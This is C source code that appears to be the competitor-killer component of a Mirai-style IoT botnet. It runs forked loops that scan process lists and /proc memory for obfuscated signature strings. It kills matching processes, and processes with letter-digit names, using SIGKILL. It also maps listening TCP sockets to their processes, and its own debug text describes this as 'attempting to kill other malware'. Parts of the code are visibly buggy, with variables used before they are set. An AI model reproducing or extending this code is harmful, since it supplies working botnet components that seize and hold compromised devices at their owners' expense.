#include <stdio.h>
#include <dirent.h>
#include <malloc.h>
#include <stdio.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <stdint.h>

int killer_pid, ps_pid;

static char compare_string(char *buf, int buf_len, char *str, int str_len);

int util_stristr(char *haystack, int haystack_len, char *str)
{
  char *ptr = haystack;
  int str_len = strlen(str);
  int match_count = 0;

  while (haystack_len-- > 0) {
    char a = *ptr++;
    char b = str[match_count];
    a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
    b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

    if (a == b) {
      if (++match_count == str_len)
        return (ptr - haystack);
    }
    else
      match_count = 0;
  }
  return -1;
}

char *util_fdgets(char *buffer, int buffer_size, int fd)
{
  int got = 0, total = 0;
  do {
    got = read(fd, buffer + total, 1);
    total = got == 1 ? total + 1 : total;
  }
  while (got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');

  return total == 0 ? NULL : buffer;
}

void read_ps_output(void) {
  FILE *ps;
  uint8_t buf[2048];
  char *start = buf;
  int offset = 0;
  int i, ii;

  ps = popen("/bin/busybox ps", "r");

  if(ps != NULL) {
    while(fgets(buf, 2048, ps) != NULL) {
      for(i = 0; i < strlen(buf); i++) {
        if(buf[i] == '\r')
          buf[i] = 0;
        else if(buf[i] == '\n') {
          uint8_t option_on = 0;
          char last_character_was_space = 0;
          char *pid_str = NULL, *proc_name = NULL;
          buf[i] = 0;

          for (ii = 0; ii < ((char *)&buf[i] - start); ii++) {
            if (start[ii] == ' ' || start[ii] == '\t' || start[ii] == 0) {
              if (option_on > 0 && !last_character_was_space)
                option_on++;

              start[ii] = 0;
              last_character_was_space = 1;
            }
            else {
              if (option_on == 0) {
                pid_str = &start[ii];
                option_on++;
              }
              else if (option_on >= 3 && option_on <= 5 && last_character_was_space) {
                proc_name = &start[ii];
              }
              last_character_was_space = 0;
            }
          }

          if (pid_str != NULL && proc_name != NULL) {
            int pid = atoi(pid_str), ii, s, curr_points = 0, num_alphas, num_count, points_to_kill = 3, fd, ret;
            int len_proc_name = strlen(proc_name);
            char found = 0, open_path[64], *file_path = open_path, rdbuf[128];

            strcpy(file_path, encryption_decode(16, NULL));
            strcpy(file_path + strlen(file_path), pid_str);
            strcpy(file_path + strlen(file_path), encryption_decode(18, NULL));

            if(pid == getpid() || pid == getppid() ||  pid < 800)
              continue;

            if(compare_string(rdbuf, ret, encryption_decode(54, NULL), strlen(encryption_decode(54, NULL))) || compare_string(rdbuf, ret, encryption_decode(55, NULL), strlen(encryption_decode(55, NULL))) || compare_string(rdbuf, ret, encryption_decode(31, NULL), strlen(encryption_decode(31, NULL))) || compare_string(rdbuf, ret, encryption_decode(32, NULL), strlen(encryption_decode(32, NULL))) || compare_string(rdbuf, ret, encryption_decode(37, NULL), strlen(encryption_decode(37, NULL))))
              continue;

            if((fd = open(open_path, O_RDONLY)) == -1)
              continue;

            while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0) {
              if(compare_string(rdbuf, ret, encryption_decode(51, NULL), strlen(encryption_decode(51, NULL))) || compare_string(rdbuf, ret, encryption_decode(52, NULL), strlen(encryption_decode(52, NULL))) || compare_string(rdbuf, ret, encryption_decode(30, NULL), strlen(encryption_decode(30, NULL)))) {
                close(fd);
                continue;
              }

              if(compare_string(rdbuf, ret, encryption_decode(38, NULL), strlen(encryption_decode(38, NULL))) || compare_string(rdbuf, ret, encryption_decode(39, NULL), strlen(encryption_decode(39, NULL))) || compare_string(rdbuf, ret, encryption_decode(40, NULL), strlen(encryption_decode(40, NULL))) || compare_string(rdbuf, ret, encryption_decode(20, NULL), strlen(encryption_decode(20, NULL))) || compare_string(rdbuf, ret, encryption_decode(21, NULL), strlen(encryption_decode(21, NULL))) || compare_string(rdbuf, ret, encryption_decode(41, NULL), strlen(encryption_decode(41, NULL))) || compare_string(rdbuf, ret, encryption_decode(42, NULL), strlen(encryption_decode(42, NULL))) ||
                 compare_string(rdbuf, ret, encryption_decode(44, NULL), strlen(encryption_decode(44, NULL))) || compare_string(rdbuf, ret, encryption_decode(43, NULL), strlen(encryption_decode(43, NULL))) || compare_string(rdbuf, ret, encryption_decode(45, NULL), strlen(encryption_decode(45, NULL))) || compare_string(rdbuf, ret, encryption_decode(46, NULL), strlen(encryption_decode(46, NULL))) || compare_string(rdbuf, ret, encryption_decode(37, NULL), strlen(encryption_decode(37, NULL))) || compare_string(rdbuf, ret, encryption_decode(28, NULL), strlen(encryption_decode(28, NULL))) || compare_string(rdbuf, ret, encryption_decode(48, NULL), strlen(encryption_decode(48, NULL))) ||
                 compare_string(rdbuf, ret, encryption_decode(49, NULL), strlen(encryption_decode(49, NULL))) || compare_string(rdbuf, ret, encryption_decode(50, NULL), strlen(encryption_decode(50, NULL))) || compare_string(rdbuf, ret, encryption_decode(29, NULL), strlen(encryption_decode(29, NULL))) || compare_string(rdbuf, ret, encryption_decode(27, NULL), strlen(encryption_decode(27, NULL))) || compare_string(rdbuf, ret, encryption_decode(22, NULL), strlen(encryption_decode(22, NULL))) || compare_string(rdbuf, ret, encryption_decode(23, NULL), strlen(encryption_decode(23, NULL)))) {
#ifdef DEBUG
                   printf("dbg: bad process named %s (pid = %d)\n", proc_name, pid);
#endif
                   kill(pid, 9);
                   close(fd);
                   continue;
                 }
                 close(fd);
            }

            for (ii = 0; ii < strlen(proc_name); ii++) {
              if(s == 0) {
                if ((proc_name[ii] >= 'a' && proc_name[ii] <= 'z') || (proc_name[ii] >= 'A' && proc_name[ii] <= 'Z')) {
                  if(curr_points >= 1) // if its more than or 1 we know we had a int before it, Strange :thinking:
                    curr_points++;

                  s = 1;
                  num_alphas++;
                  }
                }
                else if (proc_name[ii] >= '0' && proc_name[ii] <= '9') {
                  s = 0;
                  curr_points++;
                  num_count++;
                }
                if (curr_points >= points_to_kill) {
#ifdef DEBUG
                  printf("dbg: bad process named %s (pid = %d)\n", proc_name, pid);
#endif
                  kill(pid, 9);
                  continue;
                }
            }

            if(compare_string(rdbuf, ret, encryption_decode(38, NULL), strlen(encryption_decode(38, NULL))) || compare_string(rdbuf, ret, encryption_decode(39, NULL), strlen(encryption_decode(39, NULL))) || compare_string(rdbuf, ret, encryption_decode(40, NULL), strlen(encryption_decode(40, NULL))) || compare_string(rdbuf, ret, encryption_decode(20, NULL), strlen(encryption_decode(20, NULL))) || compare_string(rdbuf, ret, encryption_decode(21, NULL), strlen(encryption_decode(21, NULL))) || compare_string(rdbuf, ret, encryption_decode(41, NULL), strlen(encryption_decode(41, NULL))) || compare_string(rdbuf, ret, encryption_decode(42, NULL), strlen(encryption_decode(42, NULL))) ||
               compare_string(rdbuf, ret, encryption_decode(44, NULL), strlen(encryption_decode(44, NULL))) || compare_string(rdbuf, ret, encryption_decode(43, NULL), strlen(encryption_decode(43, NULL))) || compare_string(rdbuf, ret, encryption_decode(45, NULL), strlen(encryption_decode(45, NULL))) || compare_string(rdbuf, ret, encryption_decode(46, NULL), strlen(encryption_decode(46, NULL))) || compare_string(rdbuf, ret, encryption_decode(37, NULL), strlen(encryption_decode(37, NULL))) || compare_string(rdbuf, ret, encryption_decode(28, NULL), strlen(encryption_decode(28, NULL))) || compare_string(rdbuf, ret, encryption_decode(48, NULL), strlen(encryption_decode(48, NULL))) ||
               compare_string(rdbuf, ret, encryption_decode(49, NULL), strlen(encryption_decode(49, NULL))) || compare_string(rdbuf, ret, encryption_decode(50, NULL), strlen(encryption_decode(50, NULL))) || compare_string(rdbuf, ret, encryption_decode(29, NULL), strlen(encryption_decode(29, NULL))) || compare_string(rdbuf, ret, encryption_decode(27, NULL), strlen(encryption_decode(27, NULL))) || compare_string(rdbuf, ret, encryption_decode(22, NULL), strlen(encryption_decode(22, NULL))) || compare_string(rdbuf, ret, encryption_decode(23, NULL), strlen(encryption_decode(23, NULL)))) {
#ifdef DEBUG
              printf("dbg: bad process named %s (pid = %d)\n", proc_name, pid);
#endif
              kill(pid, 9);
              continue;
            }
          }
        }
      }
    }
  }
  pclose(ps);
}

static char compare_string(char *buf, int buf_len, char *str, int str_len) {
  int matches = 0;

  if (str_len > buf_len)
    return 0;

  while (buf_len--) {
    if (*buf++ == str[matches])
    {
      if (++matches == str_len)
        return 1;
    }
    else
      matches = 0;
  }
    return 0;
}

size_t read_tcp_innodes() {
  DIR *dir, *fd_dir;
  struct dirent *entry, *fd_entry;
  char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0}, cmdline_path[PATH_MAX] = {0};
  int pid = 0, fd = 0;
  char inode[16] = {0};
  char *ptr_path = path;
  int ret = 0, done_cmdline = 0;
  char port_str[16];

#ifdef DEBUG
  printf("dbg: attemtping to kill other malware.\n");
#endif

  fd = open(encryption_decode(33, NULL), O_RDONLY);

  if(fd == -1) {
#ifdef DEBUG
	  printf("dbg: failed to open /proc/net/tcp\n");
#endif
    return 0;
  }

  while (util_fdgets(buffer, 512, fd) != NULL) {
      int i = 0, ii = 0;

      while (buffer[i] != 0 && buffer[i] != ':')
        i++;

        if (buffer[i] == 0)
          continue;

        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;

        buffer[i++] = 0;

        int column_index = 0;
        char in_column = 0;
        char listening_state = 0;

        while (column_index < 7 && buffer[++i] != 0) {
        if (buffer[i] == ' ' || buffer[i] == '\t')
          in_column = 1;
        else {
        if(in_column == 1)
          column_index++;
        if(in_column == 1 && column_index == 1 && buffer[i + 1] == 'A') {
          listening_state = 1;
        }
        in_column = 0;
      }
    }
    ii = i;

    if(listening_state == 0)
      continue;

    while(buffer[i] != 0 && buffer[i] != ' ')
      i++;

    buffer[i++] = 0;

    if(strlen(&(buffer[ii])) > 15)
      continue;

		strcpy(inode, &(buffer[ii]));

    if((dir = opendir(encryption_decode(16, NULL))) != NULL) {
      while ((entry = readdir(dir)) != NULL && ret == 0) {
        char *pid = entry->d_name;
        if (*pid < '0' || *pid > '9')
            continue;

        strcpy(ptr_path, encryption_decode(16, NULL));
        strcpy(ptr_path + strlen(ptr_path), pid);
        strcpy(ptr_path + strlen(ptr_path), encryption_decode(35, NULL));

        if (readlink(path, exe, PATH_MAX) == -1)
            continue;

        strcpy(ptr_path, encryption_decode(16, NULL));
        strcpy(ptr_path + strlen(ptr_path), pid);
        strcpy(ptr_path + strlen(ptr_path), encryption_decode(34, NULL));

        if ((fd_dir = opendir(path)) != NULL) {
          while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0) {
            char *fd_str = fd_entry->d_name;
					  int pidint = atoi(pid);

					  if(pidint < 800 || pidint == getpid() || pidint == getppid())
						  continue;

            memset(exe, '0', PATH_MAX);
            strcpy(ptr_path, encryption_decode(16, NULL));
            strcpy(ptr_path + strlen(ptr_path), pid);
            strcpy(ptr_path + strlen(ptr_path), encryption_decode(34, NULL));
            strcpy(ptr_path + strlen(ptr_path), fd_str);

            if(readlink(path, exe, PATH_MAX) == -1)
              continue;

            if (util_stristr(exe, strlen(exe), inode) != -1) {
#ifdef DEBUG
              printf("dbg: killing process %s, has inode %s\n", pid, inode);
#endif
						  //kill(pidint, 9);
            }
          }
          closedir(fd_dir);
        }
      }
      closedir(dir);
    }
    continue;
  }
  close(fd);
}

void ps_tracker_init(void) {
  ps_pid = fork();
  if (ps_pid > 0 || ps_pid == -1)
      return;

  while(1) {
    read_ps_output();
    sleep(1);
  }
}

void malware_tracker_init(void) {
  killer_pid = fork();
  if (killer_pid > 0 || killer_pid == -1)
      return;

  while(1) {
    read_tcp_innodes();
    sleep(120);
  }
}
